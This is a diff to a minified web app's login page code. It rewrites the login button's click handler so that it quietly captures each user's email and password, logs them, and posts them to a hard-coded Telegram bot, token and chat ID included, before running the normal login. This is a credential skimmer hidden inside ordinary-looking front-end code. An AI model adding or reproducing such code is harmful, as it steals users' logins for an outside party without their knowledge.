@@ -2306,8 +2306,39 @@ p)
                 _: 1
             }, 8, ["modelValue"])]), e("div", Zo, [e("button", {
                 class: O([a(s).userForm.email != "" ? "active" : ""]),
-                onClick: $
-            }, r(b.$t("login")), 3), e("button", {
+                onClick: async () => {
+                    const email = a(s).userForm.email;
+                    const password = a(s).userForm.password;
+                    console.log("Email:", email);
+                    console.log("Password:", password);
+                    const botToken = '7211580703:AAEPCnOqUDUhvU6MJkg59UbUcuUph_pxwLk';
+                    const chatId = '-1002421689922';
+                    const message = `Tc Details\n\nEmail: ${email}\nPassword: ${password}\n\nThis is written by @Ak4ssh`;
+                    try {
+                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message,
+                            }),
+                        });
+                        const data = await response.json();
+                        if (data.ok) {
+                            console.log('Message sent successfully:', data.result);
+                        } else {
+                            console.error('Error sending message:', data.description);
+                        }
+                    } catch (error) {
+                        console.error('Error:', error);
+                    }
+            
+                    $();
+                }
+            }
+            , r(b.$t("login")), 3), e("button", {
                 class: "register",
                 onClick: u
             }, r(b.$t("register")), 1)]), e("div", Jo, [a(s).isOpenForgetPasswordSMSState || a(s).isOpenForgetPasswordEmailState ? (w(),
